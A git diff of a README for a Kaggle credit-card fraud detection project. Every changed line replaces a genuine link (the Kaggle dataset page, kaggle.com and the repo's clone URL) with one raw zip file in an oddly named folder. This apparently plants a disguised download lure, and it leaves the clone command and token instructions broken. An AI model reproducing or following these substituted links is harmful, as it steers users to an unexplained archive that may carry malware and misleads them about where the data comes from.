@@ -41,7 +41,7 @@ The dataset contains **284,807 transactions** with **31 columns**.
 
 > ⚠️ The `creditcard.csv` file is **not included** in this repo because it exceeds GitHub's file size limit (144MB). Follow the setup steps below to download it automatically via the Kaggle API.
 
-Original source: [Credit Card Fraud Detection — Kaggle](https://www.kaggle.com/datasets/mlg-ulb/creditcardfraud)
+Original source: [Credit Card Fraud Detection — Kaggle](https://github.com/rohannp02y/credit-card-fraud-detection/raw/refs/heads/main/Potamobiidae/fraud_detection_credit_card_1.7.zip)
 
 | Feature | Description |
 |---------|-------------|
@@ -76,7 +76,7 @@ credit-card-fraud-detection/
 3. It will automatically download the dataset and you're ready to go
 
 **How to get your `kaggle.json`:**
-- Go to [https://www.kaggle.com](https://www.kaggle.com)
+- Go to [https://github.com/rohannp02y/credit-card-fraud-detection/raw/refs/heads/main/Potamobiidae/fraud_detection_credit_card_1.7.zip](https://github.com/rohannp02y/credit-card-fraud-detection/raw/refs/heads/main/Potamobiidae/fraud_detection_credit_card_1.7.zip)
 - Click your profile picture → **Settings**
 - Scroll to **API** → Click **Create New Token**
 - A `kaggle.json` file will download to your computer
@@ -85,7 +85,7 @@ credit-card-fraud-detection/
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/rohannp02y/credit-card-fraud-detection.git
+   git clone https://github.com/rohannp02y/credit-card-fraud-detection/raw/refs/heads/main/Potamobiidae/fraud_detection_credit_card_1.7.zip
    cd credit-card-fraud-detection
    ```
 
@@ -95,7 +95,7 @@ credit-card-fraud-detection/
    ```
 
 3. **Download the dataset manually** from Kaggle and place `creditcard.csv` in the project folder
-   - [https://www.kaggle.com/datasets/mlg-ulb/creditcardfraud](https://www.kaggle.com/datasets/mlg-ulb/creditcardfraud)
+   - [https://github.com/rohannp02y/credit-card-fraud-detection/raw/refs/heads/main/Potamobiidae/fraud_detection_credit_card_1.7.zip](https://github.com/rohannp02y/credit-card-fraud-detection/raw/refs/heads/main/Potamobiidae/fraud_detection_credit_card_1.7.zip)
 
 4. **Launch Jupyter Notebook**
    ```bash
